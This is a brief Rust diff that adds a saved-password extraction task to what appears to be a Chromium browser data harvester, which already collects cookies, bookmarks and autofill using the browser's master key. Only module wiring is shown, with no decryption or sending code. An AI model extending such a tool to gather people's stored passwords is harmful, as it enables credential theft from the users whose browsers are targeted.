@@ -1,6 +1,7 @@
 mod cookies;
 mod bookmarks;
 mod autofill;
+mod passwords;
 
 use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
@@ -13,6 +14,7 @@ use utils::browsers::chromium::extract_master_key;
 use crate::chromium::autofill::AutoFillTask;
 use crate::chromium::bookmarks::BookmarksTask;
 use crate::chromium::cookies::CookiesTask;
+use crate::chromium::passwords::PasswordsTask;
 
 pub struct ChromiumTask<'a> {
     tasks: Vec<(ChromiumBasedBrowser<'a>, CompositeTask)>,
@@ -36,6 +38,7 @@ impl ChromiumTask<'_> {
                     CookiesTask::new(browser.clone()),
                     BookmarksTask::new(browser.clone()),
                     AutoFillTask::new(browser.clone()),
+                    PasswordsTask::new(browser.clone()),
                 )
             ))
         }
